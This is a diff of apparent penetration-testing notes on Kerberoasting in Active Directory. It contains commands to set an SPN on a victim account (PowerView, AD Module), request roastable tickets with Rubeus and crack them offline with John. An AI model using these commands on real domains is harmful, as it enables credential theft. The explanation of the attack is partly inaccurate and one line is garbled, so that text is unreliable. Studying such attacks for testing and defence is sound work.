@@ -1,8 +1,7 @@
 # Kerberoast
 
-In a Kerberoast attack, the attacker requests a Kerberos session ticket (TGS)  to retrieve the service account's NTLM hash, which is partially encrypted with the service account's hash. \
-This hash is then cracked offline to extract the service account's password.\
-
+In a Kerberoast attack, the attacker requests a Kerberos session ticket (TGS) to retrieve the service account's NTLM hash, which is partially encrypted with the service account's hash.\
+This hash is then cracked offline to extract the service account's password.\\
 
 ## SPNs
 
@@ -24,7 +23,7 @@ Get-ADUser -Filter {Servicer -Filter {ServicePrincipalName -ne "$null"} - Proper
 
 ## Set SPNs
 
-With enough rights (GenericAll/GenericWrite), a target user's SPN can be set
+With enough rights (GenericAll/GenericWrite), a target user's SPN can be set but must be unique in the forest.
 
 {% tabs %}
 {% tab title="PowerView" %}
@@ -35,6 +34,12 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDP
 # Set SPN
 Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
 
+```
+{% endtab %}
+
+{% tab title="AD Module" %}
+```
+Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='dcorp/whatever'}
 ```
 {% endtab %}
 {% endtabs %}
@@ -63,4 +68,3 @@ Rubeus.exe kerberoast /user:svcadmin  /rc4opsec
 ```powershell
 john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt
 ```
-
